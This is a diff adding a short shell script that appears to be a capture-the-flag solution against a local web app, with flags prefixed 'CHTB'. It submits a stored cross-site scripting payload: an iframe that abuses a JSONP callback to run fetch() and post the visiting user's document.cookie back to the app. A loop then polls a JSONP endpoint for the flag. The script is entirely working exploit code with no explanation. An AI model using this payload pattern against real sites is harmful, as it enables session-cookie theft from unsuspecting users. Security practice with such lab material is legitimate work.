@@ -1,0 +1,10 @@
+host=127.0.0.1:1337
+
+curl "http://$host/api/submit" -H 'Content-Type: application/json' \
+    --data-raw $'{"complaint":"<iframe src=\\"/list?callback=fetch(\'/api/submit\',{method: \'POST\',headers: {\'Content-Type\': \'application/json\'},body: JSON.stringify({\'complaint\':document.cookie})});//\\">"}'
+
+
+while :
+do
+    curl -qs http://$host/api/jsonp | grep CHTB
+done
